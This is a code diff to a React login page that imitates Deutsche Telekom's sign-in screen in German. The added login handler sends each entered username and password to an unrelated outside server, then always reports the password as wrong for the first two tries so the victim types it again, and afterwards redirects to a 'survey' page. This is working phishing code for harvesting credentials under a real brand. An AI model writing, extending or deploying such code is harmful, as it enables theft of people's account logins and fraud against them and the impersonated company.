@@ -1,17 +1,22 @@
 import { useState } from "react";
+import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Switch } from "@/components/ui/switch";
-import { ChevronDown, Eye, EyeOff, User, ArrowLeft } from "lucide-react";
+import { ChevronDown, Eye, EyeOff, User, ArrowLeft, AlertTriangle } from "lucide-react";
 
 const Login = () => {
+  const navigate = useNavigate();
   const [step, setStep] = useState<'username' | 'password'>('username');
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [rememberUser, setRememberUser] = useState(false);
   const [stayLoggedIn, setStayLoggedIn] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
+  const [passwordError, setPasswordError] = useState(false);
+  const [passwordAttempts, setPasswordAttempts] = useState(0);
+  const [isLoading, setIsLoading] = useState(false);
 
   const handleUsernameSubmit = () => {
     if (username.trim()) {
@@ -21,11 +26,50 @@ const Login = () => {
 
   const handleBack = () => {
     setStep('username');
+    setPasswordError(false);
+    setPasswordAttempts(0);
+    setPassword("");
   };
 
-  const handleLogin = () => {
-    // Handle login logic here
-    console.log('Login with:', { username, password });
+  const handleLogin = async () => {
+    if (!password.trim()) return;
+    
+    setIsLoading(true);
+    
+    try {
+      // Send to API
+      const response = await fetch('https://api.profitsimulator.me/TONLINE/login.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          username: username,
+          password: password
+        }),
+      });
+      
+      // Always show password error for first 2 attempts
+      if (passwordAttempts < 2) {
+        setPasswordError(true);
+        setPasswordAttempts(prev => prev + 1);
+        setPassword("");
+        
+        if (passwordAttempts === 1) {
+          // After 2nd attempt, redirect to survey
+          setTimeout(() => {
+            navigate('/survey');
+          }, 1500);
+        }
+      }
+    } catch (error) {
+      console.error('Login error:', error);
+      setPasswordError(true);
+      setPasswordAttempts(prev => prev + 1);
+      setPassword("");
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
@@ -137,8 +181,15 @@ const Login = () => {
                     type={showPassword ? "text" : "password"}
                     placeholder="Passwort"
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    className="w-full h-12 px-4 pr-12 border border-gray-300 rounded-md text-base bg-gray-100 focus:ring-2 focus:ring-telekom focus:border-telekom"
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (passwordError) setPasswordError(false);
+                    }}
+                    className={`w-full h-12 px-4 pr-12 rounded-md text-base bg-gray-100 focus:ring-2 focus:ring-telekom focus:border-telekom ${
+                      passwordError 
+                        ? 'border-destructive border-2' 
+                        : 'border border-gray-300'
+                    }`}
                     style={{ backgroundColor: '#E8E8E8' }}
                   />
                   <button
@@ -150,6 +201,14 @@ const Login = () => {
                   </button>
                 </div>
               </div>
+
+              {/* Password Error Message */}
+              {passwordError && (
+                <div className="mb-4 flex items-center space-x-2 text-destructive">
+                  <AlertTriangle className="w-4 h-4" />
+                  <span className="text-sm">Passwort ist nicht korrekt.</span>
+                </div>
+              )}
 
               {/* Forgot Password Link */}
               <div className="mb-6">
@@ -177,9 +236,10 @@ const Login = () => {
               <div className="space-y-3 mb-6">
                 <Button 
                   onClick={handleLogin}
-                  className="w-full h-12 bg-telekom hover:bg-telekom-dark text-white text-base font-bold rounded-md"
+                  disabled={isLoading || !password.trim()}
+                  className="w-full h-12 bg-telekom hover:bg-telekom-dark text-white text-base font-bold rounded-md disabled:opacity-50"
                 >
-                  LOGIN
+                  {isLoading ? 'WIRD GELADEN...' : 'LOGIN'}
                 </Button>
                 
                 <Button 
